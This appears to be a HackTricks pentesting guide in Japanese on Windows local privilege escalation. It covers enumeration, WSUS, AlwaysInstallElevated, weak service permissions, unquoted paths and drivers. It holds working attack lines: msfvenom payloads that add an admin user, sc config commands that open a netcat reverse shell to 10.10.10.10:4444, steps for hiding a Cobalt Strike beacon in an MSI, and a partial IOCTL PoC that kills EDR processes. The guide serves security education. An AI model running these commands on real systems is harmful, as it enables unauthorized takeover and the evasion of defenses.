# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation ベクトルを探すための最良のツール：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の基礎理論

### Access Tokens

**Windows Access Tokens が何か分からない場合は、先に次のページを読んでください：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細は次のページを確認してください：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels が何か分からない場合は、先に次のページを読んでください：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows セキュリティコントロール

Windows にはシステムの**列挙を妨げる**、実行ファイルの実行を制限する、あるいはあなたの活動を**検知する**など、さまざまな機能があります。privilege escalation の列挙を始める前に、以下の**ページ**を**読み**、これらの**防御** **メカニズム**をすべて**列挙**してください：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください（適用されているパッチも確認すること）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョン Exploits

この[このサイト](https://msrc.microsoft.com/update-guide/vulnerability)はMicrosoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件以上の脆弱性が登録されており、Windows環境が持つ**膨大な攻撃対象面**を示しています。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれている)_

**ローカル（システム情報あり）**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github の exploits リポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に資格情報や有用な情報が保存されているか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell トランスクリプトファイル

有効化する方法は [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で確認できます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell のパイプライン実行の詳細が記録されます。実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が含まれます。ただし、完全な実行内容や出力結果がすべて記録されるとは限りません。

これを有効にするには、ドキュメントの "Transcript files" セクションの指示に従い、**"Module Logging"** を **"Powershell Transcription"** の代わりに選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell ログの最後の15件のイベントを表示するには、次を実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全な活動と全内容の記録がキャプチャされ、各コードブロックが実行時に記録されることが保証されます。このプロセスにより各操作の包括的な監査トレイルが保持され、forensicsや悪意ある挙動の解析に有用です。実行時点でのすべての活動を記録することで、プロセスに関する詳細な洞察が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは Windows Event Viewer のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
直近20件のイベントを表示するには、次のコマンドを使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http を使って要求されている場合、システムを侵害できます。

ネットワークが非SSLのWSUS更新を使用しているかどうかは、次を cmd で実行して確認します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShellで次のように:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` に等しい場合。

その場合、**悪用可能です。** 最後のレジストリ値が `0` の場合、WSUS エントリは無視されます。

この脆弱性を悪用するには、次のようなツールを使用できます: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - これらは非SSLのWSUSトラフィックに'偽'の更新を注入するMiTMに特化したエクスプロイトスクリプトです。

研究はここを参照：

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本的に、これはこのバグが悪用する欠陥です：

> ローカルユーザのプロキシを変更できる権限があり、Windows Updates が Internet Explorer の設定で構成されたプロキシを使用している場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自身のトラフィックを傍受し、資産上で昇格したユーザとしてコードを実行することが可能になります。
>
> さらに、WSUS サービスは現在のユーザの設定を使用するため、その証明書ストアも使用します。WSUS ホスト名の自己署名証明書を生成してこの証明書を現在のユーザの証明書ストアに追加すれば、HTTP と HTTPS の両方の WSUS トラフィックを傍受できます。WSUS は証明書に対して trust-on-first-use 型の検証を実装する HSTS のような仕組みを持たないため、提示された証明書がユーザにより信頼され、ホスト名が正しければ、サービスはそれを受け入れます。

この脆弱性はツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) を使って悪用できます（入手可能になれば）。

## サードパーティ製の自動アップデータとAgent IPC（local privesc）

多くのエンタープライズエージェントは localhost の IPC インターフェースと特権付きのアップデートチャネルを公開しています。enrollment を攻撃者のサーバに強制でき、updater が rogue root CA を信頼するか署名検証が弱い場合、ローカルユーザは SYSTEM サービスがインストールする悪意ある MSI を配布できます。一般化した手法（Netskope の stAgentSvc チェーン – CVE-2025-0309 に基づく）は以下を参照：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

特定の条件下の Windows ドメイン環境には、local privilege escalation の脆弱性があります。これらの条件には、LDAP signing が強制されていない環境、ユーザが Resource-Based Constrained Delegation (RBCD) を設定できる自己権限を持っていること、そしてユーザがドメイン内でコンピュータを作成できる能力が含まれます。これらの要件はデフォルト設定で満たされる点に注意してください。

エクスプロイトは [https://github.com/Dec0ne/KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) にあります。

攻撃のフローについては次を参照してください: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**もし**これら2つのレジストリが**有効**（値が**0x1**）になっている場合、任意の権限を持つユーザは `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

`Write-UserAddMSI` コマンドを power-up から使用して、カレントディレクトリ内に特権昇格用の Windows MSI バイナリを作成します。 このスクリプトは、ユーザー/グループ追加を促す事前コンパイル済みの MSI インストーラーを書き出します（したがって GIU アクセスが必要です）：
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで権限を昇格できます。

### MSI Wrapper

このチュートリアルを読んで、これらのツールを使ってMSI wrapperを作成する方法を学んでください。なお、**.bat** ファイルをラップして、**just** **execute** **command lines** したいだけの場合も可能です。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike または Metasploit を使用して、`C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を **生成**します。
- Visual Studio を開き、Create a new project を選択し、検索ボックスに "installer" と入力します。Setup Wizard プロジェクトを選択して Next をクリックします。
- プロジェクト名を AlwaysPrivesc のように付け、場所は `C:\privesc` を指定し、place solution and project in the same directory を選択して Create をクリックします。
- ファイルの選択（ステップ3/4）にたどり着くまで Next をクリックし続けます。Add をクリックして先ほど生成した Beacon ペイロードを選択し、Finish をクリックします。
- Solution Explorer で AlwaysPrivesc プロジェクトを選択し、Properties で TargetPlatform を x86 から x64 に変更します。
- Author や Manufacturer のような他のプロパティも変更できます。これによりインストールされたアプリがより正当らしく見える場合があります。
- プロジェクトを右クリックして View > Custom Actions を選択します。
- Install を右クリックして Add Custom Action を選択します。
- Application Folder をダブルクリックし、beacon.exe ファイルを選択して OK をクリックします。これによりインストーラが実行されるとすぐに beacon ペイロードが実行されます。
- Custom Action Properties の下で Run64Bit を True に変更します。
- 最後に build します。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、プラットフォームを x64 に設定していることを確認してください。

### MSI Installation

マルウェアの `.msi` ファイルの **installation** を **background** で実行するには:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### 監査設定

これらの設定は何が**記録される**かを決定するので、注意が必要です
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding、ログがどこに送信されているかを知るのは興味深い
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** はドメインに参加しているコンピュータ上のローカル Administrator パスワードの管理のために設計されており、各パスワードが一意でランダム化され、定期的に更新されることを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACLs を通じて十分な権限が付与されたユーザーのみがアクセスでき、許可された場合にローカル管理者パスワードを参照できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**プレーンテキストのパスワードは LSASS に保存されます** (Local Security Authority Subsystem Service).\
[**このページの WDigest に関する詳細**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する保護を強化し、信頼されていないプロセスがそのメモリを**読み取る**、またはコードを注入する試みを**ブロック**することで、システムをさらに保護しました。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。目的は、デバイスに保存された資格情報を pass-the-hash のような攻撃から保護することです。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** は **Local Security Authority** (LSA) により認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録されたセキュリティパッケージによって認証されると、通常、そのユーザーの **Domain credentials** が確立されます。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループの中に、注目すべき権限を持つものがないか確認してください。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

**特権グループに属している場合、権限を昇格できる可能性があります**。ここで特権グループと、それを悪用して権限を昇格する方法について学んでください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**詳細を見る** このページで **token** が何かを確認してください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
次のページを確認して、**興味深い tokens について学び**、それらを悪用する方法を確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログイン済みユーザー / Sessions
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスを列挙して、**プロセスのコマンドライン内にパスワードが含まれていないか確認する**。\
実行中の**overwrite some binary running**が可能か、またはバイナリフォルダに対するwrite permissionsがあるか確認して、可能であれば[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用する:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に[**electron/cef/chromium debuggers** が実行されているか確認してください。悪用すると権限昇格につながる可能性があります](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリが配置されているフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

sysinternals の **procdump** を使って、実行中のプロセスのメモリダンプを作成できます。  
FTP のようなサービスはメモリ内に **credentials in clear text in memory** を保持していることがあり、メモリをダンプして credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 安全でない GUI アプリ

**SYSTEM として実行されているアプリケーションは、ユーザーに CMD を起動させたり、ディレクトリを参照させたりする場合があります。**

例: "Windows Help and Support" (Windows + F1) で "command prompt" を検索し、"Click to open Command Prompt" をクリックします。

## サービス

Service Triggers により、Windows は特定の条件が発生したときにサービスを起動できます（named pipe/RPC endpoint activity、ETW events、IP availability、device arrival、GPO refresh など）。SERVICE_START 権限がなくても、トリガーを発動して特権サービスを起動できることが多いです。列挙と起動の手法はこちらを参照：

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するために**sc**を使用できます。
```bash
sc qc <service_name>
```
各サービスの必要な特権レベルを確認するために、_Sysinternals_ の **accesschk** バイナリを用意しておくことをお勧めします。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」が任意のサービスを変更できるかどうかを確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

もし次のエラーが発生している場合（例: SSDPSRV）：

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次の方法で有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost が動作するには SSDPSRV に依存していることを考慮してください（XP SP1 向け）**

**この問題の別の回避策**は次のコマンドを実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスのバイナリパスを変更する**

「Authenticated users」グループがサービスに対して**SERVICE_ALL_ACCESS**を持っている場合、サービスの実行可能バイナリを変更することが可能です。変更して**sc**を実行するには：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
特定の権限を通じて特権昇格が可能です:

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再構成を許可します。
- **WRITE_DAC**: アクセス許可の再構成を可能にし、サービス構成を変更できるようになります。
- **WRITE_OWNER**: 所有権の取得とアクセス許可の再構成を許可します。
- **GENERIC_WRITE**: サービス構成を変更する能力を継承します。
- **GENERIC_ALL**: 同様にサービス構成を変更する能力を継承します。

この脆弱性の検出と悪用には _exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが配置されているフォルダに**書き込み権限があるか**を確認してください ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
サービスによって実行される全てのバイナリは **wmic** を使って取得でき（system32 ではないもの）、権限は **icacls** で確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また、**sc** と **icacls** を使用できます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスレジストリの変更権限

任意のサービスレジストリを変更できるかどうか確認してください。\
以下の方法でサービス**レジストリ**に対する**権限**を**確認**できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているかどうかを確認してください。もしそうであれば、サービスによって実行されるバイナリを変更できます。

実行されるバイナリのPathを変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory 権限

レジストリに対してこの権限を持っている場合、**このレジストリの下にサブレジストリを作成できる**ことを意味します。Windows サービスの場合、これは**任意のコードを実行するのに十分です：**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### 引用符で囲まれていないサービスパス

実行ファイルへのパスが引用符で囲まれていない場合、Windows は空白の前までの各候補を順に実行しようとします。

例えば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて列挙:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性はmetasploitで検出および悪用できます**: `exploit/windows/local/trusted\_service\_path` metasploitでサービスバイナリを手動で作成することもできます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能はバイナリを指すように設定できます。このバイナリを置換できる場合、権限昇格が可能になることがあります。詳細は [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) を参照してください。

## アプリケーション

### インストール済みアプリケーション

バイナリの**権限**（上書きできれば権限昇格が可能な場合があります）および**フォルダ**の権限を確認してください（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

設定ファイルを変更して特定のファイルを読み取れるか、または Administrator アカウント (schedtasks) によって実行されるバイナリを変更できるか確認してください。

システム内の弱いフォルダ/ファイルの権限を見つける方法は次のとおり:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 起動時に実行

**別のユーザーによって実行される registry や binary を上書きできないか確認する。**\
**以下のページ**を**読んで**、興味深い **autoruns locations to escalate privileges** について詳しく学んでください:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバ

潜在的な **サードパーティの 不審な/脆弱な** ドライバを探す
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

脆弱な呼び出しが攻撃者制御の Object Manager パスを開くような race-condition バグの場合、ルックアップを意図的に遅らせる（max-length components や deep directory chains を使用）ことで、ウィンドウをマイクロ秒から数十マイクロ秒にまで拡大できます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive 脆弱性により、deterministic layouts をgroomし、writable HKLM/HKU descendants をabuseし、metadata corruption をカスタムドライバなしで kernel paged-pool overflows に変換できます。フルチェーンは次を参照：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### device objects における FILE_DEVICE_SECURE_OPEN 欠如の悪用 (LPE + EDR kill)

一部の署名済みサードパーティドライバは IoCreateDeviceSecure を使って強力な SDDL 付きで device object を作成するが、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れることがあります。このフラグがないと、デバイスが余分なコンポーネントを含むパスで開かれた場合に secure DACL が適用されず、非特権ユーザでも次のような namespace path を使ってハンドルを取得できます:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

ユーザがデバイスを開けるようになると、ドライバが公開する特権付き IOCTLs を LPE や改ざんに悪用できます。実際に観測された例:
- 任意のプロセスに対してフルアクセスのハンドルを返す（token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser）。
- 制限のない raw disk の read/write（オフライン改ざん、ブート時永続化トリック）。
- Protected Process/Light (PP/PPL) を含む任意のプロセスを終了させることで、カーネル経由でユーザ空間から AV/EDR を kill 可能にする。

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
